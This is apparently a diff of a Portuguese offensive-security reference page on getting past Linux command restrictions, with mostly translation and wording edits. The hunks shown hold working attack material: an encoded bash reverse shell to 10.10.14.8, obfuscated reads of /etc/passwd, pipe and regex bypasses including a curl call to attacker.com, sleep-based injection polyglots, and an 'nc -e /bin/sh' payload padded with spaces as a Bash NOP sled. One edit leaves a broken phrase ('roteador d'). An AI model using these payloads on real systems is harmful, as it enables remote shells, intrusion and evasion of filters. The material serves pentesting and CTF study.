@@ -1,8 +1,10 @@
 # Bypass de Restrições do Linux
 
+{{#include ../../../banners/hacktricks-training.md}}
+
 ## Bypasses de Limitações Comuns
 
-As coleções de command injection e WAF evasion em PayloadsAllTheThings, o cheat sheet do Bo0oM e os dois artigos vinculados da Secjuice fornecem contexto para as variações de sintaxe do shell nesta seção.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+As coleções de command-injection e WAF-evasion em PayloadsAllTheThings, o cheat sheet de Bo0oM e os dois artigos vinculados da Secjuice fornecem contexto para as variações de sintaxe de shell nesta seção.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -18,7 +20,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Caminhos de bypass e palavras proibidas
+### Caminhos de Bypass e palavras proibidas
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -105,12 +107,12 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass de backslash e slash
+### Bypass de barra invertida e barra encimada
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass de pipes
+### Contornar pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -202,21 +204,21 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Contornar possíveis regexes
+### Bypass de possíveis regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-A invocação a seguir usa o Bashfuscator, um framework de ofuscação de Bash de código aberto; o link do repositório no comentário do código é mantido para navegação.<sup>[[8]](#references)</sup>
+A seguinte invocação usa o Bashfuscator, um framework open-source de ofuscação do Bash; o link do repositório no comentário do código é mantido para navegação.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE com 5 caracteres
 
-Os dois exemplos históricos de 5 caracteres a seguir são mantidos como reproduções de desafios: o repositório principal do desafio está disponível no [repositório de Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), enquanto o segundo link de write-up no bloco de código é apenas uma navegação cuja disponibilidade atual não foi verificada.<sup>[[9]](#references)</sup>
+Os dois exemplos históricos de 5 caracteres a seguir são mantidos como reproduções de desafios: o repositório principal do desafio está disponível no [repositório de Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), enquanto o segundo link de write-up no bloco de código é uma navegação cuja disponibilidade atual não foi verificada.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -314,36 +316,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## NOP Sled de Bash baseado em espaços ("Bashsledding")
 
-Quando uma vulnerabilidade permite controlar parcialmente um argumento que acaba chegando a `system()` ou a outro shell, o offset do payload pode ser incerto. Alan Cao e Will Tan descrevem um caso restrito em um dispositivo embarcado no qual um shell payload foi espalhado pela NVRAM mapeada na memória e prefixado com espaços.<sup>[[5]](#references)</sup>
+Quando uma vulnerabilidade permite controlar parcialmente um argumento que, em última instância, chega a `system()` ou a outro shell, o offset do payload pode ser incerto. Alan Cao e Will Tan descrevem um caso restrito em um dispositivo embarcado no qual um shell payload foi distribuído pela NVRAM mapeada em memória e prefixado com espaços.<sup>[[5]](#references)</sup>
 
-Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação; o Bash define espaços e tabulações como espaços em branco que separam palavras em um simple command.<sup>[[5]](#references)[[7]](#references)</sup>
+Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação; o Bash define espaços e tabulações como blanks que separam palavras em um simple command.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Se uma cadeia ROP (ou outra primitive de corrupção de memória) passar um ponteiro para uma string de comando que comece em qualquer posição dentro do bloco de espaços, o Bash poderá interpretar os espaços iniciais restantes até alcançar o comando; no exploit do roteador citado, isso tornou utilizáveis offsets de string incertos.<sup>[[5]](#references)[[7]](#references)</sup>
+Se uma cadeia ROP (ou outra primitive de corrupção de memória) passar um ponteiro para uma string de comando que comece em qualquer ponto dentro do bloco de espaços, o Bash poderá analisar os espaços iniciais restantes até alcançar o comando; no exploit do roteador d, isso tornou utilizáveis offsets incertos de strings.<sup>[[5]](#references)[[7]](#references)</sup>
 
 Casos de uso práticos em alvos embarcados restritos incluem:<sup>[[5]](#references)</sup>
 
-1. **Blobs de configuração mapeados em memória** (por exemplo, NVRAM) que sejam acessíveis entre processos.<sup>[[5]](#references)</sup>
-2. Canais de payload nos quais o atacante não possa escrever bytes NULL para alinhar o payload (uma adaptação geral do problema de alinhamento).<sup>[[5]](#references)</sup>
-3. Dispositivos embarcados com um ambiente pequeno de `ash`/`sh` do BusyBox, que o BusyBox documenta como applets em sistemas com recursos limitados.<sup>[[10]](#references)</sup>
+1. **Blobs de configuração mapeados na memória** (por exemplo, NVRAM) acessíveis entre processos.<sup>[[5]](#references)</sup>
+2. Canais de Payload nos quais o atacante não pode escrever bytes NULL para alinhar o Payload (uma adaptação geral do problema de alinhamento).<sup>[[5]](#references)</sup>
+3. Dispositivos embarcados com um ambiente BusyBox `ash`/`sh` pequeno, que o BusyBox documenta como applets em sistemas com recursos limitados.<sup>[[10]](#references)</sup>
 
-> 🛠️  Combine esta técnica com gadgets ROP que chamem `system()` em um laboratório controlado; a pesquisa citada sobre o roteador demonstra essa combinação em hardware restrito.<sup>[[5]](#references)</sup>
+> 🛠️  Combine esta técnica com gadgets ROP que chamem `system()` em um lab controlado; a pesquisa sobre o roteador d demonstra essa combinação em hardware restrito.<sup>[[5]](#references)</sup>
 
 ## References
 
-- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [1] [PayloadsAllTheThings - Injeção de Comandos](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Técnicas de evasão de Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Técnicas de evasão de Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [3] [Técnicas de Evasão de Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Técnicas de Evasão de Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 - [5] [Alan Cao e Will Tan — Explorando zero days em hardware abandonado – blog da Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — página de manual do Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
